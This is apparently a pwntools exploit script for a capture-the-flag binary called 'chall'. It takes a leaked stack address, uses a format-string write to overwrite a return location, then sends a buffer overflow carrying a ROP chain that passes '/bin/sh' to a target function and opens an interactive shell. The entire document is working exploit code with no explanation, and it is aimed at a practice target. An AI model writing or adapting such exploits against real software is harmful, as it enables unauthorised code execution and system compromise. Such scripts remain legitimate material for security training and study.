from pwn import *

t=process("./chall")
offset=120
#gdb.attach(t,api=True,gdbscript='''
#	b *vuln+349
#	b *vuln+322
#	''')
leak=t.recvline()
rdi=0x0000000000401326
bin_sh=0x404018
addr=int(leak.split(b"at ")[1].strip(b"\n"),16)
log.info("buffer address :"+hex(addr))
size=addr & 0x00000000ffff
rip=addr+280
leave=4199177-size
log.info("stack due to rip :"+hex(rip))
payload=b"%4199358c%10$ln"
payload=payload.ljust(16,b"a")+p64(rip)
t.sendline(payload)
win=b"A"*offset+p64(rdi)+p64(bin_sh)+p64(0x000000000040131e)
t.sendline(win)
t.interactive()
